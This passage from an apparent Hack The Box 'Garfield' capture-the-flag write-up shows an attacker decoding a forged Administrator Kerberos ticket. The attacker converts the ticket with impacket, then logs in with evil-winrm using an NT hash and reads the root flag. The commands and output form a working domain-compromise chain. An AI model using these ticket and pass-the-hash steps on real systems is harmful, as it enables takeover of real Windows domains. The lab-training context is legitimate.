rllPCTQ3oXRUp6269evV5Bm1zb4m3hWqSpRa8iiTIrxz4SG4jkRPVz4HPmNKl2q5OUNRD0lUMQzitH7R5JCna1IwcDeUqd8gid12O7NGBYeiy9AfDimPW4cbHcTecxAAcjVko4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgPi4jicH+etcftd9pwzPaidtCGy5Yd/T9k2upq+/DobWhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDQwODIzMjMzNFqlERgPMjAyNjA0MDgyMzIzMzRaphEYDzIwMjYwNDA5MDkyMzM0WqcRGA8yMDI2MDQxNTIzMjMzNFqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=

[*] Ticket written to ticket_2026_04_08_23_23_34_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

#### Converting from base64 to kirb

```dhall
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ cat > /tmp/tgs.b64 << 'EOF'
doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB7QBe/EhT1t7HLpgQOUWvKw5GwFetOJ7h7QC+pvDGdyYUqaQXoLqE9T55pH7jodWIA6xyUH+Jk9E9N7/joBLryUHhtDMPSDgh/AW+epYiLYE+63/3oNuptfhkHq95inwCQvXFKNgq18DjaAV1aHJtTKFBg9cgrvakR6iAVs4BwUieCBJT1v2KcETHpsWbkTcwpJwxWNnXKXINBUc+xbpLr049Ljwbw5lejfEw8l3ki2AVlHdv6Uc7EJTyLkVFrNQ6LJd0vZhYapS9AZgog5O/7WqDXOspl3YuqiAD2Z+Uy2CLIAof/13lwvxTB27P9UNajs/20+gyli8sVEP1CWUMf6GIoaxlvKoqwjnYMpZyUnFHWmCqh/vwlzQpQsLRFAeLI+VUMH6Qup+Ym+8o9hVJZKJYvMqM+tFkZ3L/9TB1d3VDICDe13LM5YpYWGuD/Pd9SLIRDHVKgMXJEpnLNMQE0HrgLb+b+J71NjGsXdPH2ORRI2vbqjdyaqOhkv1r0o5orOwlc3V1Z53XMmmXv12pBUlsuX82lYjXJWNw7K1PYKO3rA1lAHS9FF+T6IOPYrrpFxHhuBGsgI3v8NKBAEKAcYXetvWYyofGh1HyJi2UH4Zzmk6soeGjzPDIJM4zZe5UiA0BXtJ5NIiFvveiOL3SCKhOMP+zs1hAzwe7ENoSzcTUeqrlIL6wwUoWmEwRrJgmOzE9/7oUCmI7risG1K0bIEqsRKVbs9V1n90syMjyAESwPFrrmxs9RVchDUpOK4tg1WbivTa42d0xbF4sYx/pYoe7N0Q7/EkPWZxbppxUlmkHURuzZT/TY+upvSx+XCQQLKLyo9SWnkPYeOMOIM1ItnOyB3RX4UCInpBv+WrEA56URZlL7lbVS8vMEt38y46vk/1Aju0xWpgrLepRZeoWMCWs5/d5Li9OCoYP5V/w7675AgiClrMbFhPlw0ZoSLzKN8fVXWsMRRttHs79HlsSdGavKM28nsOxsTaPnLrSdUTILbLq4khhohFR9tcD+ofNPIdYqYTZZiBCPQd2NzOLMXttcJYdvR9RVxsRe5v/19V5IZKhujyU8EiUHMGestchLSYGXpGrBe+hooRwX4700LIhZ3t2jzdBZbKHIhc6CiGsp8xZB7oYdgi7G9CDWPN90+gd37cEcA9PfvmUGlcGVG/baRoLdPUz8Vb8O6Fz47GD6h8FiJufxfrN2oDIzHHabMjxP052fkgtOAXTpwduEJ0fKddDOSXRLBXUTjuUJQLleAwwD4XFws8Qe+rllPCTQ3oXRUp6269evV5Bm1zb4m3hWqSpRa8iiTIrxz4SG4jkRPVz4HPmNKl2q5OUNRD0lUMQzitH7R5JCna1IwcDeUqd8gid12O7NGBYeiy9AfDimPW4cbHcTecxAAcjVko4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgPi4jicH+etcftd9pwzPaidtCGy5Yd/T9k2upq+/DobWhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDQwODIzMjMzNFqlERgPMjAyNjA0MDgyMzIzMzRaphEYDzIwMjYwNDA5MDkyMzM0WqcRGA8yMDI2MDQxNTIzMjMzNFqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=
EOF
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ base64 -d /tmp/tgs.b64 > /tmp/admin_tgs.kirbi

```

```dhall
──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ impacket-ticketConverter /tmp/admin_tgs.kirbi /tmp/admin_tgs.ccache
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ export KRB5CCNAME=/tmp/admin_tgs.ccache

```

### Root Flag

```dhall
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ evil-winrm -i 10.129.26.207 -u Administrator -H ee238f6debc752010428f20875b092d5
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/11/2026  12:07 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
162655f9d8c5371da121af3cb776f89f
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```